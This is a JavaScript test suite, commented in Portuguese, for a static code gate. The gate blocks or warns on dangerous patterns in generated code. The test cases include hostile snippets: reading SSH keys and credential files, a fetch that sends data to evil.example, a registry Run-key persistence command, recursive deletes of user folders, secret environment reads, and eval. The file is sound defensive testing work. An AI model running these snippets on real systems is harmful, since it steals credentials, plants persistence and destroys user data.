import test from "node:test";
import assert from "node:assert/strict";

import {
  RULES,
  RULE_IDS,
  scanSource,
  scanFile,
  evaluate,
  evaluateFile,
  decide,
  formatDecision,
  classifyPath,
  ruleById,
} from "./static-gate.mjs";

/**
 * Workspace fictício: os testes não tocam no disco, só passam a raiz.
 * Fica FORA do diretório de trabalho de propósito — vários casos precisam de um
 * caminho "fora do workspace" para provar que o gate o classifica assim.
 */
const WS = process.env.TMPDIR || "C:\\work\\selfevopi-a6";

const CLEAN = `
// modulo de exemplo: soma dois numeros e devolve um status
export function soma(a, b) {
  return a + b;
}

export function status(ok) {
  return ok ? "ok" : "erro";
}
`;

/* ------------------------------------------------------------------ */
/* Código limpo                                                        */
/* ------------------------------------------------------------------ */

test("codigo limpo passa sem violacao", () => {
  assert.deepEqual(scanSource(CLEAN, { workspace: WS }), []);
});

test("comentario citando reg.exe nao reprova (mascara comentarios)", () => {
  const code = `// nao rode: reg.exe add HKCU\\Software\\X\nconst a = 1;\n`;
  assert.deepEqual(scanSource(code, { workspace: WS }), []);
});

test("string de exemplo com 'fetch(' nao reprova (mascara literais)", () => {
  const code = `const msg = "chame fetch( antes de continuar";\nexport default msg;\n`;
  assert.deepEqual(scanSource(code, { workspace: WS }), []);
});

test("eval de comentario e de string nao conta como eval real", () => {
  assert.deepEqual(scanSource(`/* eval("x") */\nconst s = 'eval("y")';\n`, { workspace: WS }), []);
});

/* ------------------------------------------------------------------ */
/* Cada regra dispara                                                  */
/* ------------------------------------------------------------------ */

const CASOS = [
  ["ssh-access", `const k = fs.readFileSync(path.join(os.homedir(), ".ssh", "id_rsa"));`],
  ["credential-store", `const a = fs.readFileSync(".pi/auth.json", "utf8");`],
  ["credential-store", `const b = fs.readFileSync(".pi/agent/settings.json", "utf8");`],
  ["credential-store", `const c = fs.readFileSync("secrets.json");`],
  ["credential-store", `const d = fs.readFileSync("C:\\Users\\exemplo/.config/opencode/auth.json");`],
  ["userprofile-config", `fs.readFileSync(process.env.USERPROFILE + "\\\\.config\\\\opencode\\\\auth.json");`],
  ["registry-exe", `execFileSync("reg.exe", ["add", "HKCU\\\\Software\\\\X", "/v", "Y"]);`],
  ["registry-exe", `child.execSync('reg query HKEY_LOCAL_MACHINE\\\\Software');`],
  ["recursive-force-delete", `Remove-Item -Recurse -Force C:\\Users\\exemplo\\Documents;`],
  ["recursive-force-delete", `rm -rf /home/exemplo/Desktop;`],
  ["child-process", `const { execSync } = require("node:child_process");`],
  ["child-process", `import { spawn } from "child_process";`],
  ["child-process", `const out = execSync("dir");`],
  ["network-access", `await fetch("https://evil.example/collect?d=" + data);`],
  ["network-access", `https.request({ host: "evil.example" });`],
  ["network-access", `await axios.post(url, body);`],
  ["dynamic-eval", `const fn = new Function("return process.env");`],
  ["dynamic-eval", `const v = eval("1 + 1");`],
  ["dynamic-eval", `vm.runInNewContext(code, {});`],
  ["secret-env-read", `const t = process.env.GITHUB_TOKEN;`],
  ["secret-env-read", `const k = process.env["OPENAI_API_KEY"];`],
  ["embedded-secret", `const k = "sk-abcdefghijklmnopqrstuvwx";`],
  ["pi-state-access", `fs.readFileSync(".pi/settings.json");`],
  ["pi-state-access", `fs.readFileSync("C:\\\\Users\\\\exemplo\\\\proj\\\\.pi\\\\settings.json");`],
  ["pi-state-access", `fs.readFileSync(path.join(os.homedir(), ".pi", "agent", "models.json"));`],
  ["pi-state-access", `fs.readFileSync(path.join(root, ".pi", "settings.local.json"));`],
  ["pi-config-access", `const h = fs.readFileSync(".pi/harness/last-known-good.json");`],
  ["outside-workspace-path", `fs.readFileSync("D:\\\\dados\\\\relatorio.csv");`],
  ["process-env-read", `const home = process.env.HOME;`],
];

for (const [regra, code] of CASOS) {
  test(`regra ${regra} dispara: ${code.slice(0, 48)}`, () => {
    const vs = scanSource(code, { workspace: WS });
    assert.ok(
      vs.some((v) => v.rule === regra),
      `esperava ${regra}, veio ${JSON.stringify(vs.map((v) => v.rule))}`
    );
    const v = vs.find((x) => x.rule === regra);
    assert.equal(v.severity, ruleById(regra).severity, "severidade tem de ser a da regra");
    assert.equal(typeof v.line, "number");
    assert.ok(v.line >= 1, "linha e 1-based");
    assert.ok(v.excerpt.length > 0 && v.excerpt.length <= 180, "trecho minimo, limitado");
    // contrato: a violacao tem exatamente as quatro chaves
    assert.deepEqual(Object.keys(v).sort(), ["excerpt", "line", "rule", "severity"]);
  });
}

test("secret-env-read pega optional chaining (process.env?.TOKEN)", () => {
  const ataques = [
    `const t = process.env?.GITHUB_TOKEN;`,
    `const k = process.env?.API_KEY;`,
  ];
  for (const code of ataques) {
    const vs = scanSource(code, { workspace: WS });
    const v = vs.find((x) => x.rule === "secret-env-read");
    assert.ok(v, `esperava secret-env-read para: ${code} -> ${JSON.stringify(vs.map((x) => x.rule))}`);
    assert.equal(v.severity, "block");
  }
});

test("secret-env-read nao bloqueia env nao-secreta com optional chaining", () => {
  const code = `const home = process.env?.PATH;`;
  const vs = scanSource(code, { workspace: WS });
  assert.ok(!vs.some((v) => v.rule === "secret-env-read"), `nao devia marcar secret-env-read: ${JSON.stringify(vs.map((v) => v.rule))}`);
});

test("numero da linha aponta a linha certa", () => {
  const code = ["const a = 1;", "const b = 2;", 'const k = "sk-abcdefghijklmnopqrstuvwx";'].join("\n");
  const vs = scanSource(code, { workspace: WS });
  assert.equal(vs.find((v) => v.rule === "embedded-secret").line, 3);
});

/* ------------------------------------------------------------------ */
/* Severidade: o que bloqueia, o que só avisa                          */
/* ------------------------------------------------------------------ */

test("pi-state-access bloqueia settings e .pi/agent em qualquer formato", () => {
  const ataques = [
    `fs.readFileSync(".pi/settings.json");`,
    `fs.readFileSync(".pi/settings.local.json");`,
    `fs.readFileSync("C:\\\\Users\\\\exemplo\\\\.pi\\\\settings.json");`,
    `fs.readFileSync(path.join(os.homedir(), ".pi", "settings.json"));`,
    `fs.readFileSync(path.join(os.homedir(), ".pi", "agent", "auth.json"));`,
    `fs.readFileSync(path.join(os.homedir(), ".pi", "agent", "models.json"));`,
  ];
  for (const code of ataques) {
    const vs = scanSource(code, { workspace: WS });
    const bloqueio = vs.some((v) => v.severity === "block" && (v.rule === "pi-state-access" || v.rule === "credential-store"));
    assert.ok(bloqueio, `deveria bloquear: ${code} -> ${JSON.stringify(vs.map((v) => v.rule))}`);
  }
});

test("pi-state-access nao bloqueia .pi/harness, .pi/npm nem codigo normal", () => {
  const legitimos = [
    `fs.readFileSync(".pi/harness/last-known-good.json");`,
    `fs.readFileSync(path.join(root, ".pi", "harness", "ledger", "evals.jsonl"));`,
    `fs.readFileSync(".pi/npm/package.json");`,
    `fs.readFileSync("package.json");`,
    `const total = 1 + 1; export default total;`,
  ];
  for (const code of legitimos) {
    const vs = scanSource(code, { workspace: WS });
    const bloqueou = vs.some((v) => v.severity === "block");
    assert.equal(bloqueou, false, `bloqueou codigo legitimo: ${code} -> ${JSON.stringify(vs.map((v) => v.rule))}`);
  }
});

test("cada regra esta declarada como block ou warn", () => {
  for (const r of RULES) {
    assert.ok(r.severity === "block" || r.severity === "warn", `${r.id} tem severidade valida`);
    assert.ok(r.title && r.why, `${r.id} tem titulo e justificativa`);
  }
  assert.deepEqual([...RULE_IDS].sort(), [...new Set(RULE_IDS)].sort(), "ids unicos");
});

test("Remove-Item -Recurse -Force fora do workspace bloqueia", () => {
  const v = scanSource(`Remove-Item -Recurse -Force C:\\Users\\exemplo\\Documents;`, { workspace: WS });
  assert.equal(v.find((x) => x.rule === "recursive-force-delete").severity, "block");
});

test("Remove-Item -Recurse -Force dentro do workspace so avisa", () => {
  const v = scanSource(`Remove-Item -Recurse -Force .\\dist;`, { workspace: WS });
  const del = v.find((x) => x.rule === "recursive-force-delete");
  assert.ok(del, "a deleção tem de aparecer");
  assert.equal(del.severity, "warn");
});

test("decide agrega: block ganha de warn, warn ganha de allow", () => {
  assert.equal(decide([]).decision, "allow");
  assert.equal(decide([{ rule: "x", severity: "warn", line: 1, excerpt: "" }]).decision, "warn");
  assert.equal(
    decide([
      { rule: "x", severity: "warn", line: 1, excerpt: "" },
      { rule: "y", severity: "block", line: 2, excerpt: "" },
    ]).decision,
    "block"
  );
});

test("allow baixa uma regra para warn e desliga outra", () => {
  const code = `const { execSync } = require("child_process");\nexecSync("dir");\n`;
  assert.equal(evaluate(code, { workspace: WS }).decision, "block");

  const baixado = evaluate(code, { workspace: WS, allow: { "child-process": "warn" } });
  assert.equal(baixado.decision, "warn");
  assert.deepEqual(baixado.warningRules, ["child-process"]);

  const desligado = evaluate(code, { workspace: WS, allow: { "child-process": "off" } });
  assert.equal(desligado.decision, "allow");
  assert.deepEqual(desligado.violations, []);
});

/* ------------------------------------------------------------------ */
/* Payload do criterio de aceite                                       */
/* ------------------------------------------------------------------ */

test("payload com reg.exe e reprovado (decision=block)", () => {
  const payload = `
const { execSync } = require("child_process");
execSync('reg.exe add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v updater /d evil.exe');
`;
  const laudo = evaluate(payload, { workspace: WS });
  assert.equal(laudo.decision, "block");
  assert.ok(laudo.blockingRules.includes("registry-exe"), `regras: ${laudo.blockingRules}`);
});

test("payload lendo .ssh e reprovado (decision=block)", () => {
  const payload = `
import fs from "node:fs";
import os from "node:os";
const chave = fs.readFileSync(os.homedir() + "/.ssh/id_rsa", "utf8");
export default chave;
`;
  const laudo = evaluate(payload, { workspace: WS });
  assert.equal(laudo.decision, "block");
  assert.ok(laudo.blockingRules.includes("ssh-access"), `regras: ${laudo.blockingRules}`);
});

/* ------------------------------------------------------------------ */
/* Sem falso positivo e sem vazar conteúdo                             */
/* ------------------------------------------------------------------ */

test("arquivo real da worktree passa com zero falso positivo", async () => {
  const alvo = new URL("../router/router.mjs", import.meta.url);
  const v = await scanFile(alvo.pathname.replace(/^\/([A-Za-z]:)/, "$1"), { workspace: WS });
  assert.deepEqual(v, [], `violacoes inesperadas: ${JSON.stringify(v)}`);

  const laudo = await evaluateFile(alvo.pathname.replace(/^\/([A-Za-z]:)/, "$1"), { workspace: WS });
  assert.equal(laudo.decision, "allow");
});

test("trecho de segredo embutido nao aparece no log", () => {
  const code = `const k = "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ123456";`;
  const v = scanSource(code, { workspace: WS }).find((x) => x.rule === "embedded-secret");
  assert.ok(v);
  assert.ok(!v.excerpt.includes("ABCDEFGHIJKLMNOPQRSTUVWXYZ"), `vazou: ${v.excerpt}`);
  assert.match(v.excerpt, /redigido/);
});

test("violacao nao carrega o conteudo do arquivo, so caminho e trecho", async () => {
  const alvo = new URL("./static-gate.mjs", import.meta.url);
  const path = alvo.pathname.replace(/^\/([A-Za-z]:)/, "$1");
  const v = await scanFile(path, { workspace: WS });
  for (const item of v) {
    assert.ok(item.excerpt.length <= 180);
    assert.equal(typeof item.rule, "string");
  }
});

test("scanFile devolve aviso, nao aprovacao silenciosa, quando nao le o arquivo", async () => {
  const v = await scanFile("C:\\nao\\existe\\arquivo-xyz.mjs", { workspace: WS });
  assert.equal(v.length, 1);
  assert.equal(v[0].rule, "file-skipped");
  assert.equal(v[0].severity, "warn");
  assert.equal(v[0].line, 0);
  assert.equal(decide(v).decision, "warn");
});

/* ------------------------------------------------------------------ */
/* Utilidades                                                          */
/* ------------------------------------------------------------------ */

test("classifyPath separa dentro, fora e desconhecido", () => {
  assert.equal(classifyPath(".\\dist", WS), "inside");
  assert.equal(classifyPath("core/router", WS), "inside");
  assert.equal(classifyPath(`${WS}\\core\\router\\x.mjs`, WS), "inside");
  assert.equal(classifyPath("C:\\Users\\exemplo\\Documents", WS), "outside");
  assert.equal(classifyPath("..\\..\\Windows", WS), "outside");
  assert.equal(classifyPath("/etc/passwd", WS), "outside");
  assert.equal(classifyPath("$env:TEMP\\x", WS), "unknown");
});

test("formatDecision emite uma linha parseavel para o ledger", () => {
  const laudo = evaluate(`const { execSync } = require("child_process");\nexecSync("dir");`, {
    file: "gerado/tarefa-12.mjs",
    workspace: WS,
  });
  const line = formatDecision(laudo);
  assert.ok(line.startsWith("gate "), `formato: ${line}`);
  const json = JSON.parse(line.slice("gate ".length));
  assert.equal(json.decision, "block");
  assert.equal(json.file, "gerado/tarefa-12.mjs");
  assert.deepEqual(json.blockingRules, ["child-process"]);
  assert.deepEqual(json.lines, [1, 2]);
  assert.ok(!line.includes("\n"), "uma linha só");
});

test("formatDecision nao quebra com caminho que tem espaco", () => {
  const laudo = evaluate(CLEAN, { file: "C:\\Users\\exemplo\\Meus arquivos\\t.mjs", workspace: WS });
  const json = JSON.parse(formatDecision(laudo).slice("gate ".length));
  assert.equal(json.file, "C:\\Users\\exemplo\\Meus arquivos\\t.mjs");
});